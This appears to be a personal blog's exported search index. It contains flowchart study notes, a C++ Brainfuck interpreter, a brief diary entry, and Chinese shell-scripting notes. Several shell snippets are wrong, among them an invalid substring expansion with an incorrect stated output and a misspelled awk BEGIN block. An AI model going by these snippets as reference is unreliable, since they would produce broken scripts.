OR.</p><p>The decision box is used to apply conditions by asking a question in a flowchart.</p><p>Dry run table (预检表)<br>The concept of dry run will help you perform a logic check and understand the flow of control in a flowchart.<br>You can also use the dry run table to evaluation the output of the program with a set of sample values.<br>A dry run provides a step by step evaluation of values in the variables of the program.</p><p>Iteration<br>A loop is a sequence of instructions that will be repeated more than once.<br>A loop must always perform certain steps in a specified sequence.<br>There are two types of loops:<br>fixed loops where the number of repetitions is known;<br>variable loops where the number of repetitions is not known.<br>Statements within a loop will be executed repeatedly until the condition becomes false.</p><p>The structured programming techniques provide ways to break up a long, continuous program into a series of individual modules that are related to each other in a specified manner.<br>A large program can be divided into several modules, where each module performs a specific task. A module is also called a procedure.<br>A procedure or a module is invoked from the main program and the control returned from the procedure to the main program by using the return statement.</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> PLT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brainfuck编译器</title>
      <link href="/blog/c-Brainfuck/"/>
      <url>/blog/c-Brainfuck/</url>
      
        <content type="html"><![CDATA[<p>随便写的qwq<br>严格的说应该是翻译器233<br>改改就可以成解释器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">deque</span>&lt;<span class="keyword">char</span>&gt;::iterator pt;</span><br><span class="line"><span class="built_in">deque</span>&lt;<span class="keyword">char</span>&gt; cp;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; inf;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::iterator it;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::iterator&gt; stk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(it=inf.begin();it!=inf.end();it++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*it==<span class="string">'['</span>) cnt++;</span><br><span class="line">        <span class="keyword">if</span>(*it==<span class="string">']'</span>) cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    freopen(<span class="string">"a.in"</span>,<span class="string">"r"</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    cp.push_back(<span class="number">0</span>);</span><br><span class="line">    pt=cp.begin();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((a=getchar())!=EOF) inf.push_back(a);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(chk()) &#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error"</span>&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    it=inf.begin();</span><br><span class="line">    <span class="keyword">while</span>(it!=inf.end()) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(*it) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">                <span class="keyword">if</span>(++pt == cp.end()) cp.push_back(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">                <span class="keyword">if</span>(pt == cp.begin()) cp.push_front(<span class="number">0</span>);</span><br><span class="line">                pt--;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                (*pt)++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                (*pt)--;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'.'</span>:</span><br><span class="line"><span class="comment">//cout&lt;&lt;(int)(*pt)&lt;&lt;endl;</span></span><br><span class="line">                <span class="built_in">putchar</span>(*pt);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">                ++it,(*pt)=(*it);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">                <span class="keyword">if</span>(*pt) stk.push(it);</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> cnt=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">for</span>(it++;;it++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(*it==<span class="string">'['</span>) cnt++;</span><br><span class="line">                        <span class="keyword">if</span>(*it==<span class="string">']'</span>) cnt--;</span><br><span class="line">                        <span class="keyword">if</span>(!cnt) <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">                it=stk.top(),it--,stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">if</span>(*it!=<span class="string">'\n'</span> &amp;&amp; *it!=<span class="string">'\t'</span> &amp;&amp; *it!=<span class="string">' '</span>) &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error!"</span>&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">1</span>; &#125; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;(*it)&lt;&lt;" "&lt;&lt;(int)(*pt)&lt;&lt;endl;</span></span><br><span class="line">        it++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> development </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20181226</title>
      <link href="/blog/20181226/"/>
      <url>/blog/20181226/</url>
      
        <content type="html"><![CDATA[<p>好几天没更新博客了…或者说这博客其实一周一更，只是每次更新都不会把博文重新置顶而已。</p><p>自己过了个圣诞节好气哦。</p><p>为了自己寒假不颓废决定先写个TODOLIST</p><p>计算机二级。</p><p>写个微信小程序 学学js</p><p>就先这样。</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell笔记</title>
      <link href="/blog/note-shell/"/>
      <url>/blog/note-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="Unix-Shells"><a href="#Unix-Shells" class="headerlink" title="Unix Shells"></a>Unix Shells</h2><ul><li>Bourne shell(sh)</li><li>C shell(csh)</li><li>Korn shell(ksh)</li><li>Restricted shell</li><li>TC shell(tcsh)</li></ul><h2 id="Linux-Shells"><a href="#Linux-Shells" class="headerlink" title="Linux Shells"></a>Linux Shells</h2><ul><li>Bourne again shell(bash)</li><li>A shell(ash)</li></ul><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>在第一行加入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">或</span><br><span class="line">#!/bin/sh</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. + 空格 + 文件名</span><br></pre></td></tr></table></figure><p>(不需要权限)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. + 路径</span><br></pre></td></tr></table></figure><p>(需要权限)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash + 文件名</span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br><span class="line">b=&quot;haha&quot;</span><br></pre></td></tr></table></figure><p>注意</p><ul><li>变量名和等号之间不能有空格！</li><li>不能用关键词，首字符不能为数字，可以使用下划线</li></ul><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><p>在定义过的变量前加上$<br>可以用{}将变量名括起来，这个是可选的，但是有时候输出必须要区分开</p><h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readonly var=3</span><br><span class="line">或</span><br><span class="line">var=3</span><br><span class="line">readonly var</span><br></pre></td></tr></table></figure><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>局部变量<br>局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。</p><p>环境变量<br>所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。</p><p>shell变量<br>shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</p><p>特殊变量</p><div class="table-container"><table><thead><tr><th style="text-align:center">变量</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">$0</td><td style="text-align:center">当前脚本文件名</td></tr><tr><td style="text-align:center">$n</td><td style="text-align:center">传递给脚本或函数的参数，n是一个数字，表示第几个参数，第一个参数$1</td></tr><tr><td style="text-align:center">$#</td><td style="text-align:center">传递给脚本或函数的参数个数</td></tr><tr><td style="text-align:center">$*</td><td style="text-align:center">传递给脚本或函数的所有参数</td></tr><tr><td style="text-align:center">$@</td><td style="text-align:center">传递给脚本或函数的所有参数，被双引号包含时，与$*稍有不同</td></tr><tr><td style="text-align:center">$?</td><td style="text-align:center">上个命令的退出状态或函数的返回值</td></tr><tr><td style="text-align:center">$$</td><td style="text-align:center">当前Shell进程ID</td></tr><tr><td style="text-align:center">$!</td><td style="text-align:center">后台运行的最后一个进程的ID号</td></tr><tr><td style="text-align:center">$-</td><td style="text-align:center">显示Shell使用的当前选项，与set命令功能相同。</td></tr></tbody></table></div><p><code>$*</code> 和 <code>$@</code>的区别<br><code>$*</code> 和 <code>$@</code> 都表示传递给函数或脚本的所有参数，不被双引号(“ “)包含时，都以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code> 的形式输出所有参数。但是当它们被双引号(“ “)包含时，<code>&quot;$*&quot;</code> 会将所有的参数作为一个整体，以<br><code>&quot;$1 $2 … $n&quot;</code>的形式输出所有参数；<code>&quot;$@&quot;</code> 会将各个参数分开，以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。</p><p><code>$?</code><br>可以获取上一个命令的退出状态。所谓退出状态，就是上一个命令执行后的返回结果。退出状态是一个数字，一般情况下，大部分命令执行成功会返回 0，失败返回 1。</p><h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset a</span><br></pre></td></tr></table></figure><h2 id="Shell字符串"><a href="#Shell字符串" class="headerlink" title="Shell字符串"></a>Shell字符串</h2><p>单引号<br>原样输出，不进行转义</p><p>双引号<br>可以有变量和转义字符</p><h3 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#str&#125;</span><br></pre></td></tr></table></figure><h3 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#str:2:3&#125; #bc</span><br></pre></td></tr></table></figure><h3 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h3><p>查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo `expr index &quot;$string&quot; io`  # 输出 4</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">数组名=(值1 值2 ... 值n)</span><br><span class="line">array_name=(value0 value1 value2 value3)</span><br><span class="line">或</span><br><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br><span class="line">或</span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure><p>可以不使用连续的下标，而且下标的范围没有限制。</p><h3 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;数组名[下标]&#125;</span><br></pre></td></tr></table></figure><h3 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 取得数组元素的个数</span><br><span class="line">length=$&#123;#array_name[@]&#125;</span><br><span class="line"># 或者</span><br><span class="line">length=$&#123;#array_name[*]&#125;</span><br><span class="line"># 取得数组单个元素的长度</span><br><span class="line">lengthn=$&#123;#array_name[n]&#125;</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>用#开头<br>若大量代码需要注释，那么可以有定义成函数并不调用</p><p>多行注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>EOF 也可以使用其他符号:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;&apos;</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">&apos;</span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure><h2 id="Shell基本运算符"><a href="#Shell基本运算符" class="headerlink" title="Shell基本运算符"></a>Shell基本运算符</h2><p>原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。<br>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：</p><div class="table-container"><table><thead><tr><th style="text-align:center">运算符</th><th style="text-align:center">说明</th><th style="text-align:center">举例</th></tr></thead><tbody><tr><td style="text-align:center">+</td><td style="text-align:center">加法</td><td style="text-align:center"><code>expr $a + $b</code> 结果为 30。</td></tr><tr><td style="text-align:center">-</td><td style="text-align:center">减法</td><td style="text-align:center"><code>expr $a - $b</code> 结果为 -10。</td></tr><tr><td style="text-align:center">*</td><td style="text-align:center">乘法</td><td style="text-align:center"><code>expr $a \* $b</code> 结果为 200。</td></tr><tr><td style="text-align:center">/</td><td style="text-align:center">除法</td><td style="text-align:center"><code>expr $b / $a</code> 结果为 2。</td></tr><tr><td style="text-align:center">%</td><td style="text-align:center">取余</td><td style="text-align:center"><code>expr $b % $a</code> 结果为 0。</td></tr><tr><td style="text-align:center">=</td><td style="text-align:center">赋值</td><td style="text-align:center">a=$b 将把变量 b 的值赋给 a。</td></tr><tr><td style="text-align:center">==</td><td style="text-align:center">相等</td><td style="text-align:center">用于比较两个数字，相同则返回 true。[ $a == $b ] 返回 false。</td></tr><tr><td style="text-align:center">!=</td><td style="text-align:center">不相等</td><td style="text-align:center">用于比较两个数字，不相同则返回 true。[ $a != $b ] 返回 true。</td></tr></tbody></table></div><p>注意：条件表达式要放在方括号之间，并且要有空格，例如: [$a==$b] 是错误的，必须写成 [ $a == $b ]。 </p><p>乘号(*)前边必须加反斜杠(<code>\</code>)才能实现乘法运算；</p><p>运算</p><p><code>expr</code>函数</p><p>用<code>$(())</code>可以转化为表达式</p><p>小数运算</p><p>awk 比较复杂…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo `awk &apos;BRGIN&#123;a=5.5/3.3;print a&#125;&apos;`</span><br><span class="line">echo `awk -v x=2.45 -v y=3.123 &apos;BEGIN&#123;printf &quot;%.2f\n&quot;,x*y&#125;&apos;`</span><br></pre></td></tr></table></figure><p>| bc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s2=$(echo &quot;scale=3; 6 / 5&quot;  | bc)</span><br><span class="line">echo $s2</span><br></pre></td></tr></table></figure><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">-eq</td><td style="text-align:center">等于</td></tr><tr><td style="text-align:center">-ne</td><td style="text-align:center">不等</td></tr><tr><td style="text-align:center">-gt</td><td style="text-align:center">大于</td></tr><tr><td style="text-align:center">-lt</td><td style="text-align:center">小于</td></tr><tr><td style="text-align:center">-ge</td><td style="text-align:center">大于等于</td></tr><tr><td style="text-align:center">-le</td><td style="text-align:center">小于等于</td></tr></tbody></table></div><h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">！</td><td style="text-align:center">非</td></tr><tr><td style="text-align:center">-o</td><td style="text-align:center">或</td></tr><tr><td style="text-align:center">-a</td><td style="text-align:center">与</td></tr></tbody></table></div><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">&#124;&#124;</td><td style="text-align:center">或</td></tr><tr><td style="text-align:center">&amp;&amp;</td><td style="text-align:center">与</td></tr></tbody></table></div><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>比较的时候等号两边要加空格…</p><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">=</td><td style="text-align:center">相等</td></tr><tr><td style="text-align:center">!=</td><td style="text-align:center">不等</td></tr><tr><td style="text-align:center">-z</td><td style="text-align:center">长度是否为0</td></tr><tr><td style="text-align:center">-n</td><td style="text-align:center">长度是否不为0</td></tr><tr><td style="text-align:center">string</td><td style="text-align:center">是否为空</td></tr></tbody></table></div><h3 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h3><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">-b file</td><td style="text-align:center">检测文件是否是块设备文件</td></tr><tr><td style="text-align:center">-c file</td><td style="text-align:center">检测文件是否是字符设备文件</td></tr><tr><td style="text-align:center">-d file</td><td style="text-align:center">检测文件是否是目录</td></tr><tr><td style="text-align:center">-f file</td><td style="text-align:center">检测文件是否是普通文件（既不是目录，也不是设备文件）</td></tr><tr><td style="text-align:center">-g file</td><td style="text-align:center">检测文件是否设置了 SGID 位</td></tr><tr><td style="text-align:center">-k file</td><td style="text-align:center">检测文件是否设置了粘着位(Sticky Bit)</td></tr><tr><td style="text-align:center">-p file</td><td style="text-align:center">检测文件是否是有名管道</td></tr><tr><td style="text-align:center">-u file</td><td style="text-align:center">检测文件是否设置了 SUID 位</td></tr><tr><td style="text-align:center">-r file</td><td style="text-align:center">检测文件是否可读</td></tr><tr><td style="text-align:center">-w file</td><td style="text-align:center">检测文件是否可写</td></tr><tr><td style="text-align:center">-x file</td><td style="text-align:center">检测文件是否可执行</td></tr><tr><td style="text-align:center">-s file</td><td style="text-align:center">检测文件是否为空（文件大小是否大于0）</td></tr><tr><td style="text-align:center">-e file</td><td style="text-align:center">检测文件（包括目录）是否存在</td></tr></tbody></table></div><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>echo<br>单引号不转义，双引号转义，-e开启转义</p><p>printf<br>格式化输出</p><h2 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h2><p>用于检测某条件是否成立<br>代码中[]执行基本的算术运算</p><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h3><p>if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">if [ $(ps -ef | grep -c &quot;ssh&quot;) -gt 1 ]; then echo &quot;true&quot;; fi</span><br></pre></td></tr></table></figure></p><p>if-else<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">else</span><br><span class="line">    command</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>if-else-if-else<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if condition1</span><br><span class="line">then</span><br><span class="line">    command1</span><br><span class="line">elif condition2 </span><br><span class="line">then </span><br><span class="line">    command2</span><br><span class="line">else</span><br><span class="line">    commandN</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>for</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for var in item1 item2 ... itemN</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">for var in item1 item2 ... itemN; do command1; command2… done;</span><br></pre></td></tr></table></figure><p>计数循环<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;0..9&#125;</span><br><span class="line">$(seq 10)</span><br></pre></td></tr></table></figure></p><p>while<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>计数循环<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">int=1</span><br><span class="line">while(( $int&lt;=5 ))</span><br><span class="line">do</span><br><span class="line">    echo $int</span><br><span class="line">    let &quot;int++&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>until</p><p>直到条件满足截止<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until condition</span><br><span 